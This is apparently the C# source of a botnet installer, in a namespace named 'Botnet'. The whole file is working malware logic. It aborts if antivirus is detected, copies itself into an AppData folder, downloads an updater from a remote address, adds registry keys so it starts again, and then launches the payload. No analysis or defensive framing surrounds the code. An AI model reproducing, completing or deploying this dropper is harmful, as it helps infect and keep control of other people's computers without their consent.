using System;
using System.IO;
using System.Threading;

namespace Botnet
{
    class Installer
    {
        static void Main()
        {
            Console.WriteLine("Installer started...");

            Console.WriteLine("Checking for installed antivirus...");
            if (Utility.IsAntivirusInstalled())
            {
                Console.WriteLine("Antivirus detected. Installation aborted.");
                return;
            }

            Console.WriteLine("Checking for updater file...");
            if (File.Exists(Utility.mainDir + Utility.updaterName))
            {
                Console.WriteLine("Updater file detected.");
                Console.WriteLine("Checking for main program execution status...");
                if (Utility.IsProcessRunningByName(Utility.mainProgramName))
                {
                    Console.WriteLine("Main program is in execution. Update aborted.");
                }
                else
                {
                    Console.WriteLine("Main program is not in execution. Executing updater...");
                    System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                }
            }
            else
            {
                Console.WriteLine("Updater file not detected.");
                Console.Write("Installer executable file directory: ");
                string currentDirectory = System.Reflection.Assembly.GetExecutingAssembly().CodeBase;
                Console.WriteLine(currentDirectory);
                Console.WriteLine(Utility.mainDir);
                if (currentDirectory.Replace('/', '\\').Contains(Utility.mainDir))
                {
                    Console.WriteLine("Execution directory is in `AppData`. No need to copy the installer.");
                    Utility.WaitForInternet();
                    Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.updaterName, Utility.mainDir + Utility.updaterName);
                    Utility.AddRegistryKey(Utility.registryKeyUpdater, Utility.mainDir + Utility.updaterName);
                    Utility.DeleteRegistryKey(Utility.registryKeyInstaller);
                    Console.WriteLine("Executing updater...");
                    System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                }
                else
                {
                    Console.WriteLine("Creating installation folder: " + Utility.mainDir);
                    Directory.CreateDirectory(Utility.mainDir);
                    if (Utility.IsInternetAvailable())
                    {
                        Utility.DownloadFile(Utility.SOFTWARE_REMOTE_DIR + Utility.updaterName, Utility.mainDir + Utility.updaterName);
                        Utility.AddRegistryKey(Utility.registryKeyUpdater, Utility.mainDir + Utility.updaterName);
                        Utility.DeleteRegistryKey(Utility.registryKeyInstaller);
                        Console.WriteLine("Executing updater...");
                        System.Diagnostics.Process.Start(Utility.mainDir + Utility.updaterName);
                    }
                    else
                    {
                        Console.WriteLine("Copying installer executable file to installation folder.");
                        File.Copy(System.Reflection.Assembly.GetExecutingAssembly().CodeBase, Utility.mainDir + Utility.installerName, true);
                        Utility.AddRegistryKey(Utility.registryKeyInstaller, Utility.mainDir + Utility.installerName);
                        Console.WriteLine("Executing installer from installation folder...");
                        System.Diagnostics.Process.Start(Utility.mainDir + Utility.installerName);
                    }
                }

            }

            Thread.Sleep(10000);
        }
    }
}
